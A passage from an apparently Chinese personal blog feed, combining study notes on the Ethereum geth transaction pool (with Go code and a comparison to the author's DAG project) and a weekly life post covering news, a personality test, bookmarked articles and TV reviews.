class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// TxPoolConfig are the configuration parameters of the transaction pool.</span><br><span class="hljs-keyword">type</span> TxPoolConfig <span class="hljs-keyword">struct</span> &#123;<br>Locals    []common.Address <span class="hljs-comment">// Addresses that should be treated by default as local</span><br>NoLocals  <span class="hljs-keyword">bool</span>             <span class="hljs-comment">// Whether local transaction handling should be disabled</span><br>Journal   <span class="hljs-keyword">string</span>           <span class="hljs-comment">// Journal of local transactions to survive node restarts</span><br>Rejournal time.Duration    <span class="hljs-comment">// Time interval to regenerate the local transaction journal</span><br><br>PriceLimit <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Minimum gas price to enforce for acceptance into the pool</span><br>PriceBump  <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Minimum price bump percentage to replace an already existing transaction (nonce)</span><br><br>AccountSlots <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Number of executable transaction slots guaranteed per account</span><br>GlobalSlots  <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Maximum number of executable transaction slots for all accounts</span><br>AccountQueue <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Maximum number of non-executable transaction slots permitted per account</span><br>GlobalQueue  <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Maximum number of non-executable transaction slots for all accounts</span><br><br>Lifetime time.Duration <span class="hljs-comment">// Maximum amount of time non-executable transaction are queued</span><br><br><span class="hljs-comment">// Quorum</span><br>TransactionSizeLimit <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Maximum size allowed for valid transaction (in KB)</span><br>MaxCodeSize          <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Maximum size allowed of contract code that can be deployed (in KB)</span><br><br>&#125;<br><br><span class="hljs-keyword">var</span> DefaultTxPoolConfig = TxPoolConfig&#123;<br>Journal:   <span class="hljs-string">&quot;transactions.rlp&quot;</span>,<br>Rejournal: time.Hour,<br><br>PriceLimit: <span class="hljs-number">1</span>,<br>PriceBump:  <span class="hljs-number">10</span>,<br><br>AccountSlots: <span class="hljs-number">16</span>,<br>GlobalSlots:  <span class="hljs-number">4096</span>,<br>AccountQueue: <span class="hljs-number">64</span>,<br>GlobalQueue:  <span class="hljs-number">1024</span>,<br><br>Lifetime: <span class="hljs-number">3</span> * time.Hour,<br><br><span class="hljs-comment">// Quorum</span><br>TransactionSizeLimit: <span class="hljs-number">64</span>,<br>MaxCodeSize:          <span class="hljs-number">24</span>,<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>Locals: 定义了一组视为 local 交易的账户地址。任何来自此清单的交易均被视为 local 交易。</li><li>NoLocals: 是否禁止 local 交易处理。默认为 fasle,允许 local 交易。如果禁止，则来自 local 的交易均视为 remote 交易处理。</li><li>Journal： 存储 local 交易记录的文件名，默认是./transactions.rlp。</li><li>Rejournal：定期将 local 交易存储文件中的时间间隔。默认为每小时一次。</li><li>PriceLimit： remote 交易进入交易池的最低 Price 要求。此设置对 local 交易无效。默认值 1。</li><li>PriceBump：替换交易时所要求的价格上调涨幅比例最低要求。任何低于要求的替换交易均被拒绝。</li><li>AccountSlots： 当交易池中可执行交易（是已在等待矿工打包的交易）量超标时，允许每个账户可以保留在交易池最低交易数。默认值是 16 笔。</li><li>GlobalSlots： 交易池中所允许的可执行交易量上限，高于上限时将释放部分交易。默认是 4096 笔交易。</li><li>AccountQueue：交易池中单个账户非可执行交易上限，默认是 64 笔。</li><li>GlobalQueue： 交易池中所有非可执行交易上限，默认 1024 笔。</li><li>Lifetime： 允许 remote 的非可执行交易可在交易池存活的最长时间。交易池每分钟检查一次，一旦发现有超期的 remote 账户，则移除该账户下的所有非可执行交易。默认为 3 小时。<blockquote><p>参考：<a href="https://learnblockchain.cn/books/geth/part2/txpool/txpool.html">https://learnblockchain.cn/books/geth/part2/txpool/txpool.html</a></p></blockquote></li></ul><p>上面配置中，包含两个重要概念<strong>可执行交易</strong>和<strong>非可执行交易</strong>。可执行交易是指从交易池中择优选出的一部分交易可以被执行，打包到区块中。非可执行交易则相反，任何刚进入交易池的交易均属于非可执行状态，在某一个时刻才会提升为可执行状态。</p><blockquote><p>这是 dag 的</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> TxPool <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// The following variables must only be used atomically.</span><br>lastUpdated <span class="hljs-keyword">int64</span> <span class="hljs-comment">// last time pool was updated</span><br><br>mtx           sync.RWMutex<br>cfg           Config<br>pool          <span class="hljs-keyword">map</span>[chainhash.Hash]*TxDesc<br>orphans       <span class="hljs-keyword">map</span>[chainhash.Hash]*orphanTx<br>orphansByPrev <span class="hljs-keyword">map</span>[wire.OutPoint]<span class="hljs-keyword">map</span>[chainhash.Hash]*soterutil.Tx<br>outpoints     <span class="hljs-keyword">map</span>[wire.OutPoint]*soterutil.Tx<br>pennyTotal    <span class="hljs-keyword">float64</span> <span class="hljs-comment">// exponentially decaying total for penny spends.</span><br>lastPennyUnix <span class="hljs-keyword">int64</span>   <span class="hljs-comment">// unix time of last ``penny spend&#x27;&#x27;</span><br><br><span class="hljs-comment">// nextExpireScan is the time after which the orphan pool will be</span><br><span class="hljs-comment">// scanned in order to evict orphans.  This is NOT a hard deadline as</span><br><span class="hljs-comment">// the scan will only run when an orphan is added to the pool as opposed</span><br><span class="hljs-comment">// to on an unconditional timer.</span><br>nextExpireScan time.Time<br>&#125;<br></code></pre></td></tr></table></figure><p>交易提交到交易池还需要一个 add 函数，逻辑很简单：</p><ol><li>验证交易的有效性</li><li>如果 nonce 已存在，忽略。</li><li>如果 nonce 不存在，不可以替换 pending 中的任何交易，此时将新的交易插入 queue 的末尾</li></ol><p>注：交易中的 nonce 指的是 from 账户发出交易的次数, 从 0 开始递增，同一账户的交易会被依次确认，所以同一个 nonce 代表是同一个交易，会优先选择 price 更高的交易。</p><blockquote><p>这是我们的</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> TxPool <span class="hljs-keyword">struct</span> &#123;<br>    mtx           sync.RWMutex<br>    config      TxPoolConfig<br>    currentState  *state.StateDB <span class="hljs-comment">// 区块的当前状态</span><br>    locals  *accountSet <span class="hljs-comment">//本地交易</span><br>    journal *txJournal  <span class="hljs-comment">//  用于存储local交易记录的文件</span><br><br>pending <span class="hljs-keyword">map</span>[common.Address]*txList   <span class="hljs-comment">// 存放可执行的交易</span><br>queue   <span class="hljs-keyword">map</span>[common.Address]*txList   <span class="hljs-comment">// queued存放未来的、当前无法执行的交易</span><br><br>    chainHeadSub    event.Subscription<span class="hljs-comment">//用于订阅区块</span><br>    reqPromoteCh    <span class="hljs-keyword">chan</span> *accountSet<span class="hljs-comment">//账户集合</span><br>queueTxEventCh  <span class="hljs-keyword">chan</span> *dag.Tx<span class="hljs-comment">//Tx队列事件</span><br>&#125;<br><br><span class="hljs-keyword">type</span> TxPoolConfig <span class="hljs-keyword">struct</span> &#123;<br>Locals    []common.Address<br>Journal   <span class="hljs-keyword">string</span><br>Rejournal time.Duration<br><br>AccountSlots <span class="hljs-keyword">uint64</span><br>GlobalSlots  <span class="hljs-keyword">uint64</span><br>AccountQueue <span class="hljs-keyword">uint64</span><br>GlobalQueue  <span class="hljs-keyword">uint64</span><br><br>Lifetime time.Duration<br>&#125;<br><br><span class="hljs-keyword">var</span> DefaultTxPoolConfig = TxPoolConfig&#123;<br>Journal:   <span class="hljs-string">&quot;transactions.rlp&quot;</span>,<br>Rejournal: time.Hour,<br><br>AccountSlots: <span class="hljs-number">16</span>,<br>GlobalSlots:  <span class="hljs-number">8192</span>,<br>AccountQueue: <span class="hljs-number">64</span>,<br>GlobalQueue:  <span class="hljs-number">1024</span>,<br><br>Lifetime: <span class="hljs-number">3</span> * time.Hour,<br>&#125;<br></code></pre></td></tr></table></figure><p>当节点收到交易（本地节点发起的或 peer 广播来的）时，会先存放到 queued，txpool 在某些情况下，把 queued 中可执行的交易，转移到 pending 中。</p><ul><li>Locals: 定义了一组视为 local 交易的账户地址。任何来自此清单的交易均被视为 local 交易。</li><li>Journal： 存储 local 交易记录的文件名，默认是./transactions.rlp。</li><li>Rejournal：定期将 local 交易存储文件中的时间间隔。默认为每小时一次。</li><li>AccountSlots： 当交易池中可执行交易（是已在等待矿工打包的交易）量超标时，允许每个账户可以保留在交易池最低交易数。默认值是 16 笔。</li><li>GlobalSlots： 交易池中所允许的可执行交易量上限，高于上限时将释放部分交易。默认是 8192 笔交易。</li><li>AccountQueue：交易池中单个账户非可执行交易上限，默认是 64 笔。</li><li>GlobalQueue： 交易池中所有非可执行交易上限，默认 1024 笔。</li><li>Lifetime： 允许 remote 的非可执行交易可在交易池存活的最长时间。交易池每分钟检查一次，一旦发现有超期的 remote 账户，则移除该账户下的所有非可执行交易。默认为 3 小时。</li></ul><h2 id="链状态"><a href="#链状态" class="headerlink" title="链状态"></a>链状态</h2><p>在交易池启动后，将订阅链的区块头事件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_pool.go:274</span><br>pool.chainHeadSub = pool.chain.SubscribeChainHeadEvent(pool.chainHeadCh)<br></code></pre></td></tr></table></figure><p>并开始监听新事件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_pool.go:305</span><br><span class="hljs-keyword">for</span> &#123;<br>   <span class="hljs-keyword">select</span> &#123;<br>   <span class="hljs-comment">// Handle ChainHeadEvent</span><br>   <span class="hljs-keyword">case</span> ev := &lt;-pool.chainHeadCh:<br>      <span class="hljs-keyword">if</span> ev.Block != <span class="hljs-literal">nil</span> &#123;<br>         pool.mu.Lock()<br>         <span class="hljs-keyword">if</span> pool.chainconfig.IsHomestead(ev.Block.Number()) &#123;<br>            pool.homestead = <span class="hljs-literal">true</span><br>         &#125;<br>         pool.reset(head.Header(), ev.Block.Header())<br>         head = ev.Block<br><br>         pool.mu.Unlock()<br>      &#125;<br>  <span class="hljs-comment">//...</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接收到事件后，将执行 func (pool *TxPool) reset(oldHead, newHead *types.Header)方法更新 state 和处理交易。核心是将交易池中已经不符合要求的交易删除并更新整理交易</p><h2 id="本地交易"><a href="#本地交易" class="headerlink" title="本地交易"></a>本地交易</h2><p>在交易池中将交易标记为 local 的有多种用途：</p><ol><li>在本地磁盘存储已发送的交易。这样，本地交易不会丢失，重启节点时可以重新加载到交易池，实时广播出去。</li><li>可以作为外部程序和以太坊沟通的一个渠道。外部程序只需要监听文件内容变化，则可以获得交易清单。</li><li>local 交易可优先于 remote 交易。对交易量的限制等操作，不影响 local 下的账户和交易。</li></ol><p>对应本地交易存储，在启动交易池时根据配置开启本地交易存储能力：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_pool.go:264</span><br><span class="hljs-keyword">if</span> !config.NoLocals &amp;&amp; config.Journal != <span class="hljs-string">&quot;&quot;</span> &#123;<br>pool.journal = newTxJournal(config.Journal)<br><span class="hljs-keyword">if</span> err := pool.journal.load(pool.AddLocals); err != <span class="hljs-literal">nil</span> &#123;<br>log.Warn(<span class="hljs-string">&quot;Failed to load transaction journal&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>&#125;<br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>并从磁盘中加载已有交易到交易池。在新的 local 交易进入交易池时，将被实时写入 journal 文件。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// core/tx_pool.go:757</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *TxPool)</span> <span class="hljs-title">journalTx</span><span class="hljs-params">(from common.Address, tx *types.Transaction)</span></span> &#123;<br>   <span class="hljs-keyword">if</span> pool.journal == <span class="hljs-literal">nil</span> || !pool.locals.contains(from) &#123;<br>      <span class="hljs-keyword">return</span><br>   &#125;<br>   <span class="hljs-keyword">if</span> err := pool.journal.insert(tx); err != <span class="hljs-literal">nil</span> &#123;<br>      log.Warn(<span class="hljs-string">&quot;Failed to journal local transaction&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从上可看到，<strong>只有属于 local 账户的交易才会被记录</strong>。你又没有注意到，如果仅仅是这样的话，journal 文件是否会跟随本地交易而无限增长？答案是否定的，<strong>虽然无法实时从 journal 中移除交易。但是支持定期更新 journal 文件</strong>。<br><strong>journal 并不是保存所有的本地交易以及历史</strong>，他<strong>仅仅是存储当前交易池中存在的本地交易</strong>。因此交易池会定期对 journal 文件执行 rotate，将交易池中的本地交易写入 journal 文件，并丢弃旧数据。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go">journal := time.NewTicker(pool.config.Rejournal)<br><span class="hljs-comment">//...</span><br><span class="hljs-comment">//core/tx_pool.go:353</span><br><span class="hljs-keyword">case</span> &lt;-journal.C:<br><span class="hljs-keyword">if</span> pool.journal != <span class="hljs-literal">nil</span> &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">if</span> err := pool.journal.rotate(pool.local()); err != <span class="hljs-literal">nil</span> &#123;<br>log.Warn(<span class="hljs-string">&quot;Failed to rotate local tx journal&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>&#125;<br>pool.mu.Unlock()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="新交易信号"><a href="#新交易信号" class="headerlink" title="新交易信号"></a>新交易信号</h2><p>文章开头，有提到<strong>进入交易池的交易将被广播到网络</strong>中。这<strong>是依赖于交易池支持外部订阅新交易事件信号</strong>。任何<strong>订阅此事件的子模块</strong>，在交易池出现新的可执行交易时，均可实时接受到此事件通知，并获得新交易信息。</p><blockquote><p>需要注意的是并非所有进入交易池的交易均被通知外部，而是只有交易从非可执行状态变成可执行状态后才会发送信号。</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_pool.go:705</span><br><span class="hljs-keyword">go</span> pool.txFeed.Send(NewTxsEvent&#123;types.Transactions&#123;tx&#125;&#125;)<br><span class="hljs-comment">//core/tx_pool.go:1022</span><br><span class="hljs-keyword">go</span> pool.txFeed.Send(NewTxsEvent&#123;promoted&#125;)<br></code></pre></td></tr></table></figure><p>在交易池中，有两处地方才会执行发送信号。<br>一是<strong>交易时用于替换已经存在的可执行交易</strong>时。<br>二是有<strong>新的一批交易从非可执行状态提升到可执行状态后</strong>。<br>外部只需要订阅 SubscribeNewTxsEvent(ch chan&lt;- NewTxsEvent)新可执行交易事件，则可实时接受交易。<br>在 geth 中网络层将<strong>订阅交易事件</strong>，以便实时广播。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//eth/handler.go:213</span><br>pm.txsCh = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> core.NewTxsEvent, txChanSize)<br>pm.txsSub = pm.txpool.SubscribeNewTxsEvent(pm.txsCh)<br><span class="hljs-comment">//eth/handler.go:781</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pm *ProtocolManager)</span> <span class="hljs-title">txBroadcastLoop</span><span class="hljs-params">()</span></span> &#123;<br>   <span class="hljs-keyword">for</span> &#123;<br>      <span class="hljs-keyword">select</span> &#123;<br>      <span class="hljs-keyword">case</span> event := &lt;-pm.txsCh:<br>         pm.BroadcastTxs(event.Txs)<br>      <span class="hljs-comment">//...</span><br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>另外是矿工实时订阅交易，以便将交易打包到区块中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//miner/worker.go:207</span><br>worker.txsSub = eth.TxPool().SubscribeNewTxsEvent(worker.txsCh)<br><span class="hljs-comment">//miner/worker.go:462</span><br>txs := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[common.Address]types.Transactions)<br><span class="hljs-keyword">for</span> _, tx := <span class="hljs-keyword">range</span> ev.Txs &#123;<br>acc, _ := types.Sender(w.current.signer, tx)<br>   txs[acc] = <span class="hljs-built_in">append</span>(txs[acc], tx)<br>&#125;<br>txset := types.NewTransactionsByPriceAndNonce(w.current.signer, txs)<br>w.commitTransactions(txset, coinbase, <span class="hljs-literal">nil</span>)<br></code></pre></td></tr></table></figure><h1 id="清理交易池"><a href="#清理交易池" class="headerlink" title="清理交易池"></a>清理交易池</h1><p>交易池是完全存在内存中的，因此有大小限制，每当超过一定的阈值就需要清理。实际实现时，pending 的缓冲区容量默认为 4096，queue 的缓冲区容量默认为 1024。<br>清理的时机是交易池满的时候，清理的原则是价格较低的最先清理</p><blockquote><p>但是本项目没有设计要清理交易池</p></blockquote><h1 id="惩罚恶意账号"><a href="#惩罚恶意账号" class="headerlink" title="惩罚恶意账号"></a>惩罚恶意账号</h1><p>这也是 txpool 很重要的一个属性，可以防止恶意账户以发起大量垃圾交易。防止恶意用户造成：</p><ol><li>占用 txpool 空间</li><li>浪费节点大量内存和 CPU</li><li>降低打包性能</li></ol><p>** 只有当交易的总数量超过缓冲区大小时，txpool 才会认为有恶意账户发起大量交易。**pending 和 queued 缓冲区大小不同，但处理策略类似：</p><ol><li>pending 的缓冲区容量是 4096，当 pending 的交易数量多于此时，就会运行检查，每个账号的交易数量是否多于 16，把这些账号搜集出来，进行循环依次清理，什么意思呢？就是每轮只删除（移动到 queued）这些账号的每个账号 1 条交易，然后看数量是否降下来了，不满足再进行下一轮，直到满足。</li><li>queued 的缓冲区容量是 1024，超过之后清理策略和 pending 差不多，但这里可是真删除了。</li></ol><p>该部分功能未抽象成单独的函数，而是在 promoteExecutables()中，就是在每次把 queued 交易转移到 pending 后执行的。<br><strong>本地交易的特权</strong>，txpool 虽然对交易有诸多限制，但如果交易是本节点的账号发起的，以上数量限制等都对他无效。所以，如果你用本节点账号不停的发送交易，并不会被认为是攻击者</p><h1 id="回答问题"><a href="#回答问题" class="headerlink" title="回答问题"></a>回答问题</h1><ol><li>用户发起的交易请求（不论以何种方式）是如何转变为实际的交易的；</li></ol><p>所有与交易请求相关的参数被赋值到一个结构体中，然后进行序列化转变为可存储和传输的形式，最后生成交易并进行签名</p><ol start="2"><li>产生的交易如果不能被及时处理，是如何进入交易池的？</li></ol><p>最终是调用一个 add 函数，添加到了一个队列里</p><ol start="3"><li>本地产生的交易和从网络中接收到的交易进入交易池是否有区别？</li></ol><p>有区别，底层都是调用 add 函数</p><ol start="4"><li>交易池的基本数据结构是怎么样的（优先队列？）</li></ol><p>交易池是一个结构体，核心是 pending 和 queue 两个 map，map 的键是一个地址，值是一个交易链表形成的队列</p><ol start="5"><li>从交易池中提取交易进行打包时顺序是怎么样的（调度算法）</li></ol><p>本地优先级大于远程交易</p><p>我们可以理解为区块链底层利用交易池对并发产生的请求做了<strong>异步化</strong>，<strong>交易产生的时刻</strong>和<strong>交易被打包的时刻</strong>是<strong>随机</strong>的。</p><blockquote><p>在实现 TXpool 的时候为了保证数据的一致性会使用大量的锁</p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Life-Weekly-April-12-to-18</title>
    <link href="/2021/04/15/Life-Weekly-April-12-to-18_new/"/>
    <url>/2021/04/15/Life-Weekly-April-12-to-18_new/</url>
    
    <content type="html"><![CDATA[<h1 id="时讯"><a href="#时讯" class="headerlink" title="时讯"></a>时讯</h1><ol><li>日本宣布将把福岛核废水排放入海，还恬不知耻的推出了一个“氚”的吉祥物。</li><li>中科大夏令营开始接收报名。</li></ol><h1 id="小事"><a href="#小事" class="headerlink" title="小事"></a>小事</h1><ol><li>无聊的时候（吃完饭）给自己测了一下十六型人格，结果是“守卫者 ISFJ-A”，看了一下这个结果其实是比较准确的。</li></ol><p><img src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-1.png#clientId=ud3d92086-9aed-4&from=paste&height=341&id=ue2cb8370&margin=%5Bobject%20Object%5D&originHeight=804&originWidth=890&originalType=binary&size=46588&status=done&style=none&taskId=ud08b7ea8-50e0-4be0-846f-ac42bda13b9&width=377"><br>根据报告，守卫者人格在群体中所占比重最大，为 13%，不过我记得之前也做过这个测试，但是忘记结果了，我记得自己截了图，但是怎么也找不到，也不知道发到哪个平台了。<br>不过它描述的和我的人格真的非常像，摘抄一点：</p><blockquote><p><em>“守卫者”是真正的利他主义者，非常善良，对相信的人和事物慷慨而富有激情。</em></p></blockquote><p>这种人格类型的人（尤其是性格不安定的那一部分）经常<strong>一丝不苟到完美主义</strong>的程度，虽然他们<strong>有拖延的习惯</strong>，但他们总能<strong>可靠地按时完成工作</strong>。 守卫者人格类型的人重视自己的责任，时刻<strong>尽最大努力超出预期</strong>地让别人满意，无论在家庭还是工作中。<br><strong>天生喜欢社交</strong>是内向者身上少见的特点，“守卫者”们不会把出色的记忆力用在数据和琐事上，而是<strong>记住人和他们生活中的细节</strong>。 他们最<strong>擅长赠送礼物</strong>，他们<strong>天生富有想象力</strong>且<strong>感情细腻</strong>，他们的礼物可以送到接收者的心坎里。 对于被“守卫者”们当作朋友的同事们来说是这样，而在家庭里守卫者们会<strong>尽情表达爱意</strong>。<br><strong>弱点：</strong></p><ol><li>谦卑和害羞</li><li>压抑他们的感情</li><li>他们强烈的责任感和完美主义，加上这种对情感冲突的厌恶，造成了一种情况，即捍卫者太容易超载自己</li><li>太利他主义了，他们的麻烦却在无人协助的情况下增加。</li></ol><p>恋爱：</p><ol><li>守卫者花费大量时间和精力寻找让伴侣保持关系满意的方法。</li><li>作为回报，他们要求的就是承诺、爱，也许最重要的是欣赏。</li></ol><h1 id="本周收藏"><a href="#本周收藏" class="headerlink" title="本周收藏"></a>本周收藏</h1><h2 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h2><p>看到了哪些好文？</p><ol><li><a href="https://mp.weixin.qq.com/s/aj6LKXdAekoFCoSrpEwbAQ">攻破 GitHub 私有页面</a></li></ol><p>利用一个前缀绕过进行 XSS，利用缓存投毒进行认证流的持久化破坏。</p><ol start="2"><li><a href="https://mp.weixin.qq.com/s/k1ZRhTmNMgfaLCqniBmuNA">一篇有参考意义的产品 PPT 制作</a></li></ol><p><img src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-2.png#clientId=u49d79466-a36b-4&from=paste&height=239&id=uebef2f08&margin=%5Bobject%20Object%5D&originHeight=478&originWidth=852&originalType=binary&size=426622&status=done&style=none&taskId=ue23c0b44-6f1e-4c86-90c5-b20e1e6bff1&width=426"></p><ol start="3"><li><a href="https://mp.weixin.qq.com/s/__-d28S1X6CfpgiB3TwrTw">一位博士学长在大厂做安全算法工程师的感悟</a></li><li><a href="https://mp.weixin.qq.com/s/wDMcm4Q_waE3twkI-oajYg">基于机器学习的 Web 应用入侵威胁检测</a></li></ol><p><img src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-3.png#clientId=u49d79466-a36b-4&from=paste&height=427&id=u7c7b4016&margin=%5Bobject%20Object%5D&originHeight=854&originWidth=338&originalType=binary&size=44182&status=done&style=none&taskId=u3fa9a8b8-057c-4d41-9333-36f34a4d393&width=169"></p><ol start="5"><li><a href="https://mp.weixin.qq.com/s/fqYbyKKAXCrR8ooE_jNFdA">一篇对于处理多文字的 PPT 范例</a></li></ol><p><img src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-4.png#clientId=u49d79466-a36b-4&from=paste&height=401&id=uaedf9eeb&margin=%5Bobject%20Object%5D&originHeight=479&originWidth=851&originalType=binary&size=550925&status=done&style=none&taskId=ueb2143a6-5ef6-475a-aaf5-e9d206c1886&width=712.5"></p><ol start="6"><li><a href="https://mp.weixin.qq.com/s/elKxcNiwW14ceJOWiek2Ww">一篇关于毛玻璃效果的 PPT</a></li></ol><p><img src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-5.png#clientId=u49d79466-a36b-4&from=paste&height=242&id=ub988f9f1&margin=%5Bobject%20Object%5D&originHeight=483&originWidth=862&originalType=binary&size=179871&status=done&style=none&taskId=u45a7c337-9928-4762-93a2-20bb7020f3b&width=431"><br><img src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-6.png#clientId=u49d79466-a36b-4&from=paste&height=241&id=u603599ae&margin=%5Bobject%20Object%5D&originHeight=482&originWidth=848&originalType=binary&size=311473&status=done&style=none&taskId=uf73bcf00-d57c-4f2a-9c25-5d3b17036a9&width=424"><br><img src="https://image.hackerjerry.top/Life-Weekly-April-12-to-18-7.png#clientId=u49d79466-a36b-4&from=paste&height=212&id=u907476e8&margin=%5Bobject%20Object%5D&originHeight=424&originWidth=854&originalType=binary&size=507600&status=done&style=none&taskId=u4abc5901-834f-464a-9dcd-5c065781745&width=427"></p><h2 id="剧集"><a href="#剧集" class="headerlink" title="剧集"></a>剧集</h2><ol><li>《人潮汹涌》</li></ol><p>刘德华和肖央出演的一部本土改编剧，情节和原著有了一些变动，也很有趣。不过戏剧性冲突比韩国的原片还是要差一点，那个曾九蓉更是看的我云里雾里的，没看懂她存在的意义。笑点是比不上原著的，毕竟刘德华太帅了，很难表现出原著中“丑杀手”的一些搞笑的地方。 2.《 伍六七》第七集<br>伍六七终于到玄武国了，但是这都第七集了！！！一共就十集看个寂寞，估计这一季他连掌门的影子都见不到，还又挖了一堆坑，又是可乐，又是悬赏令，又是陈年旧账，何导可以的啊！！</p><h2 id="摘录"><a href="#摘录" class="headerlink" 